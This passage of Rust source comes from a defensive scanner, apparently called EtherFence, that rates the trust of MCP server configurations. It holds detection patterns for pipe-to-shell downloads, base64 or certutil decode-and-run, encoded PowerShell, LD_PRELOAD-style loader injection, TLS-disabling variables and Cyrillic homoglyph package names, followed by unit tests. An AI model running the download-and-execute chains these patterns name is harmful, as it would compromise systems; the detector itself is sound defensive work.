    let left = segments[segments.len() - 2];

    let right_is_shell = matches!(
        right.split_whitespace().next(),
        Some("sh") | Some("bash") | Some("zsh")
    );
    if !right_is_shell {
        return None;
    }

    let left_first = left.split_whitespace().next().unwrap_or("");
    if left_first == "curl" || left_first == "wget" {
        return Some(ObscuredLaunchPattern::PipeToShellDownloader);
    }

    let left_first_two: Vec<&str> = left.split_whitespace().take(2).collect();
    if left_first_two == ["base64", "-d"] || left_first_two == ["base64", "--decode"] {
        return Some(ObscuredLaunchPattern::DecodeThenExecutePipedToShell);
    }
    if left.to_ascii_lowercase().starts_with("certutil -decode") {
        return Some(ObscuredLaunchPattern::DecodeThenExecutePipedToShell);
    }

    None
}

/// User Story 2 (T025-T027): shell-wrapper and obscured-launch structural
/// detection, operating only on already-tokenized argument lists — never a
/// general shell parser (FR-023/FR-029).
fn assess_shell_wrapper_and_obscured_launch(
    server: &McpServer,
    invocation: &mut InvocationAssessment,
    indicators: &mut Vec<TrustIndicator>,
) {
    let Some(command) = server.command.as_deref() else {
        return;
    };
    let name = crate::classification::launcher_name(command);

    // FR-028(b): certutil's download pattern is standalone — certutil is
    // the direct command, not a shell wrapper.
    if name.eq_ignore_ascii_case("certutil") {
        if server
            .args
            .iter()
            .any(|arg| arg.to_ascii_lowercase().starts_with("-urlcache"))
        {
            invocation
                .obscured_launch_patterns
                .push(ObscuredLaunchPattern::WindowsCertutilDownloadPattern);
            push_obscured_launch_indicator(
                indicators,
                ObscuredLaunchPattern::WindowsCertutilDownloadPattern,
            );
        }
        return;
    }

    let first_arg = server.args.first().map(String::as_str);
    let wrapper = match (name, first_arg) {
        ("sh", Some("-c")) => Some(ShellWrapperKind::ShC),
        ("bash", Some("-c")) => Some(ShellWrapperKind::BashC),
        ("cmd", Some("/c")) => Some(ShellWrapperKind::CmdC),
        ("powershell", Some("-Command")) => Some(ShellWrapperKind::PowershellCommand),
        ("powershell", Some("-EncodedCommand")) => Some(ShellWrapperKind::PowershellEncodedCommand),
        ("pwsh", Some("-Command")) => Some(ShellWrapperKind::PwshCommand),
        ("pwsh", Some("-EncodedCommand")) => Some(ShellWrapperKind::PwshEncodedCommand),
        _ => None,
    };
    let Some(wrapper) = wrapper else {
        return;
    };
    invocation.shell_wrapper = Some(wrapper);
    push_wrapper_indicator(indicators, wrapper);

    let wrapped = server
        .args
        .get(1..)
        .map(|rest| rest.join(" "))
        .unwrap_or_default();

    match wrapper {
        ShellWrapperKind::PowershellEncodedCommand | ShellWrapperKind::PwshEncodedCommand => {
            invocation
                .obscured_launch_patterns
                .push(ObscuredLaunchPattern::EncodedPowerShellOption);
            push_obscured_launch_indicator(
                indicators,
                ObscuredLaunchPattern::EncodedPowerShellOption,
            );
        }
        ShellWrapperKind::PowershellCommand | ShellWrapperKind::PwshCommand
            if powershell_downloads_and_executes(&wrapped) =>
        {
            invocation
                .obscured_launch_patterns
                .push(ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression);
            push_obscured_launch_indicator(
                indicators,
                ObscuredLaunchPattern::PowershellWebRequestToInvokeExpression,
            );
        }
        _ => {}
    }

    if let Some(pattern) = pipe_to_shell_pattern(&wrapped) {
        invocation.obscured_launch_patterns.push(pattern);
        push_obscured_launch_indicator(indicators, pattern);
    }
}

// ---------------------------------------------------------------------
// User Story 3: executable-path classification and bounded local
// artifact hashing (spec FR-030-FR-045)
// ---------------------------------------------------------------------

/// Bounds the local artifact hash read (research.md Decision 9). The read
/// is streamed in fixed-size chunks, so this bounds worst-case I/O/time
/// against a pathological target, not memory.
const MAX_EXECUTABLE_HASH_BYTES: u64 = 200 * 1024 * 1024;

/// The 3 package identities already curated in v1.2.0's `EVIDENCE_RULES`
/// (research.md Decision 14) — no new identities are added in v1.3.0.
const KNOWN_SOURCE_IDENTITIES: &[&str] = &[
    "@modelcontextprotocol/server-filesystem",
    "@modelcontextprotocol/server-devops",
    "web-search-mcp",
];

fn is_windows_absolute_path(path: &str) -> bool {
    let bytes = path.as_bytes();
    let drive_letter = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && (bytes[2] == b'\\' || bytes[2] == b'/');
    drive_letter || path.starts_with("\\\\") || path.starts_with("//")
}

/// Narrow, closed set of recognized temporary-directory location prefixes
/// (Unix and Windows conventions) — not derived from the host EtherFence
/// itself runs on, so it classifies fixture data identically regardless
/// of platform (FR-020/SC-002).
fn is_temp_dir_location(path: &str) -> bool {
    let normalized = path.replace('\\', "/");
    normalized.starts_with("/tmp/")
        || normalized.starts_with("/var/tmp/")
        || normalized.contains("/Temp/")
        || normalized
            .to_ascii_lowercase()
            .contains("appdata/local/temp")
}

/// Classifies a server's statically configured executable identity
/// (FR-030). Symlinks are detected via `symlink_metadata` *before* any
/// regular-file check and are never followed (FR-034, research.md
/// Decision 10 — conservative non-following default). `PATH` is never
/// searched (FR-031).
fn classify_executable_path(command: &str) -> ExecutablePathClassification {
    if command.is_empty() {
        return ExecutablePathClassification::AmbiguousOrUnsupported;
    }
    let has_separator = command.contains('/') || command.contains('\\');
    if !has_separator {
        return ExecutablePathClassification::PathResolvedCommand;
    }
    let is_absolute = command.starts_with('/') || is_windows_absolute_path(command);
    if !is_absolute {
        return ExecutablePathClassification::RelativePath;
    }

    match std::fs::symlink_metadata(Path::new(command)) {
        Err(_) => ExecutablePathClassification::MissingPath,
        Ok(meta) if meta.file_type().is_symlink() => ExecutablePathClassification::Symlink,
        Ok(meta) if meta.is_file() => ExecutablePathClassification::AbsolutePath,
        Ok(_) => ExecutablePathClassification::NonRegularFile,
    }
}

/// Opens `path` for reading, refusing to follow a symlink at the final
/// path component. On Unix this is enforced atomically by the kernel via
/// `O_NOFOLLOW` — there is no window between checking and opening in
/// which a symlink swapped into `path` could be followed. `std`'s
/// `OpenOptionsExt::custom_flags` only *adds* bits to the flags `open()`
/// already uses, so this cannot weaken any other behavior. There is no
/// portable `O_NOFOLLOW` equivalent exposed by `std` on Windows; there,
/// this performs a plain open and relies on the file-identity check in
/// `hash_eligible_file_bounded` to detect a swapped file after the fact.
fn open_no_follow(path: &Path) -> std::io::Result<std::fs::File> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        // O_NOFOLLOW. Value is the same across all Linux architectures
        // (the only Unix target in this project's CI matrix); avoided
        // pulling in the `libc` crate for a single constant.
        const O_NOFOLLOW: i32 = 0o400_000;
        std::fs::OpenOptions::new()
            .read(true)
            .custom_flags(O_NOFOLLOW)
            .open(path)
    }
    #[cfg(not(unix))]
    {
        std::fs::File::open(path)
    }
}

/// Compares the filesystem identity of two `Metadata` values — device and
/// inode number on Unix, volume serial number and file index on Windows —
/// so that "is this still the same underlying file?" does not rely on
/// length/modified-time alone, which a maliciously (or accidentally)
/// substituted file can coincidentally match. Never claims a match on a
/// platform where a stable identity cannot be obtained.
fn same_file_identity(a: &std::fs::Metadata, b: &std::fs::Metadata) -> bool {
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        a.dev() == b.dev() && a.ino() == b.ino()
    }
    #[cfg(windows)]
    {
        use std::os::windows::fs::MetadataExt;
        matches!(
            (
                a.volume_serial_number(),
                b.volume_serial_number(),
                a.file_index(),
                b.file_index(),
            ),
            (Some(va), Some(vb), Some(ia), Some(ib)) if va == vb && ia == ib
        )
    }
    #[cfg(not(any(unix, windows)))]
    {
        let _ = (a, b);
        false
    }
}

/// Computes a SHA-256 identity for an eligible local regular file
/// (FR-037-FR-045). Only a regular file confirmed immediately before the
/// open (never a symlink) is eligible. The read is streamed in bounded
/// chunks — never fully buffered — and capped at `max_bytes` (production
/// call sites pass `MAX_EXECUTABLE_HASH_BYTES`; research.md Decision 9;
/// tests pass a small limit to exercise the oversized-file path without a
/// multi-hundred-megabyte fixture).
///
/// Race safety: a plain "check the path, then open the path" sequence has
/// a window in which `path` could be replaced by a symlink and then
/// followed by an unguarded open, or replaced by a different regular file
/// that happens to match the original's length and modified time. This is
/// closed two ways: (1) the open itself refuses to follow a symlink at the
/// final path component (`open_no_follow`, enforced by the kernel on
/// Unix); (2) every metadata comparison — before the open, on the opened
/// handle itself (immune to further path-level changes once open), and
/// after the read completes — includes filesystem file identity
/// (device+inode / volume+file-index), not just length and modified time,
/// so a same-named replacement file is detected even when it coincidentally
/// matches those two fields. Any mismatch, or any I/O error at any step,
/// discards the computed hash and returns `None` rather than reporting a
/// possibly-wrong `verified-local` result (FR-042/FR-044) — never a
/// partial or best-effort hash.
fn hash_eligible_file_bounded(path: &Path, max_bytes: u64) -> Option<String> {
    let pre = std::fs::symlink_metadata(path).ok()?;
    if pre.file_type().is_symlink() || !pre.is_file() {
        return None;
    }

    let mut file = open_no_follow(path).ok()?;

    // Validate the *opened handle's* own metadata against the pre-open
    // check, rather than trusting the open to have resolved to the same
    // object we just inspected by path.
    let opened_meta = file.metadata().ok()?;
    if !opened_meta.is_file() || !same_file_identity(&pre, &opened_meta) {
        return None;
    }

    let mut hasher = Sha256::new();
    let mut buffer = [0u8; 64 * 1024];
    let mut total: u64 = 0;
    loop {
        let read = file.read(&mut buffer).ok()?;
        if read == 0 {
            break;
        }
        total += read as u64;
        if total > max_bytes {
            return None;
        }
        hasher.update(&buffer[..read]);
    }
    let digest = hasher.finalize();

    // Re-check both the lexical path (in case it was replaced again while
    // the read was in progress) and file identity (in case a replacement
    // coincidentally matches length/modified-time) before trusting the
    // digest just computed.
    let after = std::fs::symlink_metadata(path).ok()?;
    if after.file_type().is_symlink() || !after.is_file() {
        return None;
    }
    if !same_file_identity(&pre, &after) {
        return None;
    }
    if after.len() != opened_meta.len() || after.modified().ok() != opened_meta.modified().ok() {
        return None;
    }

    Some(format!("{digest:x}"))
}

fn hash_eligible_file(path: &Path) -> Option<String> {
    hash_eligible_file_bounded(path, MAX_EXECUTABLE_HASH_BYTES)
}

fn push_path_indicator(
    indicators: &mut Vec<TrustIndicator>,
    id: &str,
    severity: Severity,
    summary: &str,
    classification: ExecutablePathClassification,
) {
    indicators.push(TrustIndicator {
        id: id.to_string(),
        severity,
        category: IndicatorCategory::ExecutablePath,
        summary: summary.to_string(),
        rationale: format!(
            "The server's configured executable path classifies as '{}'.",
            path_classification_token(classification)
        ),
        evidence: vec![EvidenceField::new(
            EvidenceKey::PathClassification,
            path_classification_token(classification),
        )],
        remediation: "Review the configured executable path for this server.".to_string(),
    });
}

fn path_classification_token(classification: ExecutablePathClassification) -> &'static str {
    match classification {
        ExecutablePathClassification::AbsolutePath => "absolute-path",
        ExecutablePathClassification::RelativePath => "relative-path",
        ExecutablePathClassification::PathResolvedCommand => "path-resolved-command",
        ExecutablePathClassification::MissingPath => "missing-path",
        ExecutablePathClassification::NonRegularFile => "non-regular-file",
        ExecutablePathClassification::Symlink => "symlink",
        ExecutablePathClassification::TemporaryDirectoryLocation => "temporary-directory-location",
        ExecutablePathClassification::AmbiguousOrUnsupported => "ambiguous-or-unsupported",
        ExecutablePathClassification::NotApplicable => "not-applicable",
    }
}

/// User Story 3 (T036-T038): classifies the executable path and, only for
/// an eligible absolute regular-file path, attempts local artifact
/// hashing. Returns `(classification, sha256)` — `ArtifactIdentityConfidence`
/// is derived by the caller (`assess_trust`) since a `KnownSource` result
/// also depends on User Story 1's parsed package identity, which this
/// function does not have access to.
fn classify_executable_path_and_hash(
    server: &McpServer,
    indicators: &mut Vec<TrustIndicator>,
) -> (ExecutablePathClassification, Option<String>) {
    let Some(command) = server.command.as_deref() else {
        return (ExecutablePathClassification::AmbiguousOrUnsupported, None);
    };

    let classification = classify_executable_path(command);

    if is_temp_dir_location(command) {
        push_path_indicator(
            indicators,
            "EF-TRUST-PATH-004",
            Severity::Medium,
            "Configured executable is located in a temporary directory",
            ExecutablePathClassification::TemporaryDirectoryLocation,
        );
    }

    match classification {
        ExecutablePathClassification::MissingPath => push_path_indicator(
            indicators,
            "EF-TRUST-PATH-001",
            Severity::Medium,
            "Configured executable path does not exist",
            classification,
        ),
        ExecutablePathClassification::NonRegularFile => push_path_indicator(
            indicators,
            "EF-TRUST-PATH-002",
            Severity::Medium,
            "Configured executable path is not a regular file",
            classification,
        ),
        ExecutablePathClassification::Symlink => push_path_indicator(
            indicators,
            "EF-TRUST-PATH-003",
            Severity::Low,
            "Configured executable path is a symlink",
            classification,
        ),
        _ => {}
    }

    let sha256 = if classification == ExecutablePathClassification::AbsolutePath {
        hash_eligible_file(Path::new(command))
    } else {
        None
    };

    (classification, sha256)
}

fn derive_artifact_identity(
    sha256: &Option<String>,
    package_identity: &Option<String>,
) -> ArtifactIdentityConfidence {
    if sha256.is_some() {
        ArtifactIdentityConfidence::VerifiedLocal
    } else if package_identity
        .as_deref()
        .is_some_and(|p| KNOWN_SOURCE_IDENTITIES.contains(&p))
    {
        ArtifactIdentityConfidence::KnownSource
    } else {
        ArtifactIdentityConfidence::Unknown
    }
}

// ---------------------------------------------------------------------
// User Story 4: environment-variable name-only risk categories
// (spec FR-052-FR-057)
// ---------------------------------------------------------------------

struct EnvCategory {
    id: &'static str,
    severity: Severity,
    summary: &'static str,
    names: &'static [&'static str],
}

/// Closed, curated environment-variable name lists, one per FR-053
/// category (research.md Decision 12). Implemented locally rather than
/// reusing `etherfence-policy`'s private `secret_looking_name` — that
/// function isn't `pub`, and `etherfence-policy` isn't currently a
/// dependency of `etherfence-setup`; restating a small closed list here
/// avoids a new cross-crate coupling for one string heuristic.
const ENV_RISK_CATEGORIES: &[EnvCategory] = &[
    EnvCategory {
        id: "EF-TRUST-ENV-001",
        severity: Severity::High,
        summary: "Environment variable name is associated with dynamic loader injection",
        names: &[
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "DYLD_INSERT_LIBRARIES",
            "DYLD_LIBRARY_PATH",
        ],
    },
    EnvCategory {
        id: "EF-TRUST-ENV-002",
        severity: Severity::Medium,
        summary: "Environment variable name overrides an interpreter or runtime path",
        names: &["PYTHONPATH", "NODE_PATH", "NODE_OPTIONS"],
    },
    EnvCategory {
        id: "EF-TRUST-ENV-003",
        severity: Severity::Medium,
        summary: "Environment variable name overrides a package-registry source",
        names: &[
            "NPM_CONFIG_REGISTRY",
            "PIP_INDEX_URL",
            "PIP_EXTRA_INDEX_URL",
            "UV_INDEX_URL",
            "NPM_TOKEN",
        ],
    },
    EnvCategory {
        id: "EF-TRUST-ENV-004",
        severity: Severity::High,
        summary: "Environment variable name is associated with disabling TLS verification",
        names: &[
            "NODE_TLS_REJECT_UNAUTHORIZED",
            "PYTHONHTTPSVERIFY",
            "GIT_SSL_NO_VERIFY",
            "NPM_CONFIG_STRICT_SSL",
        ],
    },
];

const SECRET_LIKE_SUBSTRINGS: &[&str] = &["TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "APIKEY"];

fn is_secret_like_name(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    SECRET_LIKE_SUBSTRINGS.iter().any(|s| upper.contains(s))
        || upper.ends_with("_KEY")
        || upper == "KEY"
}

fn push_env_category_indicator(
    indicators: &mut Vec<TrustIndicator>,
    category: &EnvCategory,
    name: &str,
) {
    indicators.push(TrustIndicator {
        id: category.id.to_string(),
        severity: category.severity,
        category: IndicatorCategory::EnvironmentVariable,
        summary: category.summary.to_string(),
        rationale: format!(
            "The configured environment variable name '{name}' matches a documented risk category. Only the variable name is inspected; its value is never read into evidence."
        ),
        evidence: vec![EvidenceField::new(EvidenceKey::EnvironmentVariableName, name)],
        remediation: "Review why this server needs this environment variable and scope it as narrowly as possible.".to_string(),
    });
}

fn push_secret_like_indicator(indicators: &mut Vec<TrustIndicator>, name: &str, escalated: bool) {
    let (id, severity, summary) = if escalated {
        (
            "EF-TRUST-ENV-006",
            Severity::High,
            "Secret-like environment variable name is exposed to an unknown or high-risk server",
        )
    } else {
        (
            "EF-TRUST-ENV-005",
            Severity::Medium,
            "Environment variable name looks secret-like",
        )
    };
    indicators.push(TrustIndicator {
        id: id.to_string(),
        severity,
        category: IndicatorCategory::EnvironmentVariable,
        summary: summary.to_string(),
        rationale: format!(
            "The configured environment variable name '{name}' looks secret-like. Only the variable name is inspected; its value is never read into evidence."
        ),
        evidence: vec![EvidenceField::new(EvidenceKey::EnvironmentVariableName, name)],
        remediation: "Confirm this server genuinely needs this credential and that it is scoped as narrowly as possible.".to_string(),
    });
}

/// User Story 4 (T045-T046) part 1 of 2: environment-variable name-only
/// risk categories (FR-052: names only, values never read). Runs for both
/// stdio and remote servers (FR-057a). Pushes the context-independent
/// category indicators (loader injection, path override, registry
/// override, TLS-disabling) immediately, and returns the names that look
/// secret-like for the caller to finalize via
/// `finalize_secret_like_indicators` — see that function's doc comment
/// for why the secret-like escalation cannot be decided here.
fn assess_environment_categories(
    env: &[EnvVar],
    indicators: &mut Vec<TrustIndicator>,
) -> Vec<String> {
    let mut secret_like_names = Vec::new();
    for var in env {
        for category in ENV_RISK_CATEGORIES {
            if category.names.contains(&var.name.as_str()) {
                push_env_category_indicator(indicators, category, &var.name);
            }
        }
        if is_secret_like_name(&var.name) {
            secret_like_names.push(var.name.clone());
        }
    }
    secret_like_names
}

/// User Story 4 (T045-T046) part 2 of 2: finalizes the secret-like
/// environment-variable escalation (FR-054). This MUST run only after
/// every other assessment area (invocation, shell-wrapper/obscured-launch,
/// executable-path/local-artifact, and Unicode/identity-ambiguity) has
/// already contributed its indicators to `indicators`, and after
/// `assess_environment_categories` has already pushed the non-secret-like
/// category indicators for the *same* server — otherwise the escalation
/// depends on assessment order: a high-severity finding from an area that
/// happens to run *after* this one would be silently missed, understating
/// the required escalation to `EF-TRUST-ENV-006` for a server that is, in
/// fact, high-risk overall.
fn finalize_secret_like_indicators(
    secret_like_names: &[String],
    artifact_identity: ArtifactIdentityConfidence,
    indicators: &mut Vec<TrustIndicator>,
) {
    let already_high_risk = indicators.iter().any(|i| i.severity == Severity::High);
    let escalate = artifact_identity == ArtifactIdentityConfidence::Unknown || already_high_risk;
    for name in secret_like_names {
        push_secret_like_indicator(indicators, name, escalate);
    }
}

// ---------------------------------------------------------------------
// User Story 5: Unicode and identity-ambiguity checks (spec FR-046-FR-051)
// ---------------------------------------------------------------------

/// Single curated confusable-alias entry shipped in v1.3.0 (research.md
/// Decision 14): a Cyrillic homoglyph variant of the one filesystem
/// server identity already curated in v1.2.0's `EVIDENCE_RULES` — enough
/// to prove the exact-match mechanism end-to-end with a real fixture,
/// while deliberately not asserting a broader alias table EtherFence
/// hasn't earned.
const CONFUSABLE_ALIASES: &[(&str, &str)] = &[(
    "@modelcontextprotocol/server-f\u{0456}lesystem",
    "@modelcontextprotocol/server-filesystem",
)];

fn confusable_alias_match(identity: &str) -> Option<&'static str> {
    CONFUSABLE_ALIASES
        .iter()
        .find(|(alias, _)| *alias == identity)
        .map(|(_, real)| *real)
}

/// Narrow, closed script classification (Latin/Cyrillic/Greek only) used
/// solely to detect a mixed-script identity (FR-048) — not a general
/// Unicode script-detection library. ASCII digits/punctuation are
/// excluded by returning `None` for them.
fn char_script(c: char) -> Option<&'static str> {
    match c {
        'a'..='z' | 'A'..='Z' | '\u{00C0}'..='\u{00FF}' => Some("latin"),
        '\u{0400}'..='\u{04FF}' => Some("cyrillic"),
        '\u{0370}'..='\u{03FF}' => Some("greek"),
        _ => None,
    }
}

fn is_mixed_script(identity: &str) -> bool {
    let mut scripts = std::collections::BTreeSet::new();
    for c in identity.chars() {
        if let Some(script) = char_script(c) {
            scripts.insert(script);
        }
    }
    scripts.len() > 1
}

fn push_unicode_indicator(
    indicators: &mut Vec<TrustIndicator>,
    id: &str,
    severity: Severity,
    category_token: &str,
    source: &str,
    summary: &str,
) {
    indicators.push(TrustIndicator {
        id: id.to_string(),
        severity,
        category: IndicatorCategory::UnicodeIdentity,
        summary: summary.to_string(),
        rationale: format!(
            "The server's {source} contains a {category_token} pattern that could visually mislead a reader; the raw identity string is intentionally not reproduced here (FR-051)."
        ),
        evidence: vec![EvidenceField::new(EvidenceKey::UnicodeCategory, category_token)],
        remediation:
            "Review this identity string directly in the source configuration file, in a Unicode-aware editor, before trusting it."
                .to_string(),
    });
}

fn push_confusable_indicator(
    indicators: &mut Vec<TrustIndicator>,
    source: &str,
    real_identity: &str,
) {
    indicators.push(TrustIndicator {
        id: "EF-TRUST-UNI-004".to_string(),
        severity: Severity::High,
        category: IndicatorCategory::UnicodeIdentity,
        summary: format!("The server's {source} exactly matches a curated confusable alias"),
        rationale: format!(
            "This identity is an exact match against a curated confusable variant of '{real_identity}' and may be attempting to impersonate it. An exact curated match does not prove impersonation intent."
        ),
        evidence: vec![EvidenceField::new(
            EvidenceKey::CuratedRuleId,
            "confusable-server-filesystem-001",
        )],
        remediation: format!(
            "Confirm this server is not attempting to impersonate '{real_identity}'; if unrelated, rename it to avoid confusion."
        ),
    });
}

/// Checks one identity string (a server name or parsed package identity)
/// for bidi-control/invisible characters (reusing `etherfence_mcp::unicode`
/// — research.md Decision 11), a narrow mixed-script condition, and an
/// exact curated confusable-alias match. Plain non-ASCII text with none of
/// these properties raises no indicator — this is not a universal
/// confusable or typosquatting detector (FR-050).
fn assess_identity_string(value: &str, source: &str, indicators: &mut Vec<TrustIndicator>) {
    if let Some(risk) = etherfence_mcp::unicode::inspect_policy_identifier(value) {
        match risk {
            etherfence_mcp::unicode::UnicodeRisk::BidiControl => push_unicode_indicator(
                indicators,
                "EF-TRUST-UNI-001",
                Severity::High,
                "bidi-control",
                source,
                "Identity string contains a bidirectional control character",
            ),
            etherfence_mcp::unicode::UnicodeRisk::ZeroWidth => push_unicode_indicator(
                indicators,
                "EF-TRUST-UNI-002",
                Severity::High,
                "invisible-character",
                source,
                "Identity string contains an invisible or zero-width character",
            ),
            // Plain non-ASCII text (no bidi/zero-width) is not itself a
            // documented v1.3.0 risk indicator (FR-050) — only the
            // narrower mixed-script/confusable-alias checks below apply.
            _ => {}
        }
    }
    if is_mixed_script(value) {
        push_unicode_indicator(
            indicators,
            "EF-TRUST-UNI-003",
            Severity::Medium,
            "mixed-script",
            source,
            "Identity string mixes multiple scripts within a single identity",
        );
    }
    if let Some(real_identity) = confusable_alias_match(value) {
        push_confusable_indicator(indicators, source, real_identity);
    }
}

/// User Story 5 (T049-T051): Unicode/identity-ambiguity checks on server
/// name and, when present, the parsed package identity. Runs for both
/// stdio and remote servers (FR-057a) — a remote server has no package
/// identity, so only its name is checked.
fn assess_unicode_identity(
    server: &McpServer,
    package_identity: Option<&str>,
    indicators: &mut Vec<TrustIndicator>,
) {
    assess_identity_string(&server.name, "server name", indicators);
    if let Some(package) = package_identity {
        assess_identity_string(package, "package identity", indicators);
    }
}

#[cfg(test)]
mod user_story_1_tests {
    use super::*;

    fn npx_server(name: &str, args: &[&str]) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some("npx".to_string()),
            args: args.iter().map(|a| a.to_string()).collect(),
            env: Vec::new(),
            url: None,
        }
    }

    fn runner_server(name: &str, command: &str, args: &[&str]) -> McpServer {
        McpServer {
            name: name.to_string(),
            command: Some(command.to_string()),
            args: args.iter().map(|a| a.to_string()).collect(),
            env: Vec::new(),
            url: None,
        }
    }

    #[test]
    fn npx_exact_pinned_version_raises_no_indicator() {
        let s = npx_server("pinned", &["@modelcontextprotocol/server-filesystem@1.2.3"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.runner, Some(PackageRunner::Npx));
        assert_eq!(
            a.invocation.package_identity.as_deref(),
            Some("@modelcontextprotocol/server-filesystem")
        );
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
        assert!(a.indicators.is_empty());
        assert_eq!(
            a.configuration_risk,
            ConfigurationRiskStatus::NoKnownIndicators
        );
    }

    #[test]
    fn npx_omitted_version_raises_pin_001() {
        let s = npx_server("omitted", &["@modelcontextprotocol/server-filesystem"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::Omitted)
        );
        assert_eq!(a.indicators.len(), 1);
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-001");
    }

    #[test]
    fn npx_mutable_tag_raises_pin_002() {
        let s = npx_server(
            "latest-tag",
            &["@modelcontextprotocol/server-filesystem@latest"],
        );
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::MutableTag)
        );
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-002");
    }

    #[test]
    fn npx_version_range_raises_pin_003() {
        let s = npx_server("range", &["some-package@^1.2.3"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::VersionRange)
        );
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-003");
    }

    #[test]
    fn npx_scoped_package_exact_version_pinned() {
        let s = npx_server("scoped-exact", &["@scope/name@2.0.0"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.package_identity.as_deref(),
            Some("@scope/name")
        );
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
        assert!(a.indicators.is_empty());
    }

    #[test]
    fn npx_scoped_package_no_version_omitted() {
        let s = npx_server("scoped-omitted", &["@scope/name"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.package_identity.as_deref(),
            Some("@scope/name")
        );
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::Omitted)
        );
    }

    #[test]
    fn npx_dash_y_flag_before_package_still_parses() {
        let s = npx_server(
            "with-y",
            &["-y", "@modelcontextprotocol/server-filesystem@1.0.0"],
        );
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.package_identity.as_deref(),
            Some("@modelcontextprotocol/server-filesystem")
        );
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
    }

    #[test]
    fn uvx_pinned_exact_version() {
        let s = runner_server("uvx-pinned", "uvx", &["ruff==0.5.0"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.runner, Some(PackageRunner::Uvx));
        assert_eq!(a.invocation.package_identity.as_deref(), Some("ruff"));
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
        assert!(a.indicators.is_empty());
    }

    #[test]
    fn uvx_unpinned_omitted() {
        let s = runner_server("uvx-unpinned", "uvx", &["web-search-mcp"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::Omitted)
        );
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-001");
    }

    #[test]
    fn uvx_version_range_operator() {
        let s = runner_server("uvx-range", "uvx", &["ruff>=0.5.0"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::VersionRange)
        );
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-003");
    }

    /// PEP 440 "version matching" (`==1.2.*`) is a prefix match over a
    /// range of versions, not a single resolved version — it must never
    /// classify as `ExactlyPinned` even though it uses the `==` operator.
    #[test]
    fn uvx_wildcard_equality_is_version_range_not_exact() {
        let s = runner_server("uvx-wildcard", "uvx", &["ruff==1.2.*"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::VersionRange)
        );
    }

    /// PEP 440 "arbitrary equality" (`===`) is a literal string comparison,
    /// a distinct operator from `==` — it must never classify as
    /// `ExactlyPinned`, and must not be misparsed as `==` leaving a stray
    /// `=` in the version remainder.
    #[test]
    fn uvx_arbitrary_equality_operator_is_not_exact() {
        let s = runner_server("uvx-arbitrary-eq", "uvx", &["ruff===1.2"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::UnsupportedOrAmbiguous)
        );
    }

    /// A compound (comma-separated) specifier is never a single resolved
    /// version, even when its first clause uses `==`.
    #[test]
    fn uvx_compound_specifier_with_equality_is_version_range() {
        let s = runner_server("uvx-compound", "uvx", &["ruff==1.2.3,!=1.2.4"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::VersionRange)
        );
    }

    /// An environment marker appended to an otherwise-exact specifier
    /// means the resolved version is conditional, not a single pin.
    #[test]
    fn uvx_equality_with_environment_marker_is_version_range() {
        let s = runner_server("uvx-marker", "uvx", &["ruff==1.2.3; python_version>='3.8'"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::VersionRange)
        );
    }

    #[test]
    fn uvx_malformed_equality_remainder_is_unsupported_or_ambiguous() {
        let s = runner_server("uvx-malformed-version", "uvx", &["ruff== "]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::UnsupportedOrAmbiguous)
        );
    }

    #[test]
    fn pipx_run_pinned_exact_version() {
        let s = runner_server("pipx-pinned", "pipx", &["run", "black==24.1.0"]);
        let a = assess_trust(&s);
        assert_eq!(a.invocation.runner, Some(PackageRunner::PipxRun));
        assert_eq!(a.invocation.package_identity.as_deref(), Some("black"));
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::ExactlyPinned)
        );
        assert!(a.indicators.is_empty());
    }

    #[test]
    fn pipx_run_unpinned_omitted() {
        let s = runner_server("pipx-unpinned", "pipx", &["run", "black"]);
        let a = assess_trust(&s);
        assert_eq!(
            a.invocation.version_expression,
            Some(VersionExpressionKind::Omitted)
        );
        assert_eq!(a.indicators[0].id, "EF-TRUST-PIN-001");
    }

    #[test]
    fn malformed_npx_invocation_with_no_args_is_reported_distinctly() {
        let s = npx_server("malformed", &[]);
        let a = assess_trust(&s);
        assert!(a.invocation.malformed_runner_invocation);
        assert_eq!(a.invocation.package_identity, None);
        assert_eq!(a.invocation.version_expression, None);
        assert_eq!(a.indicators.len(), 1);
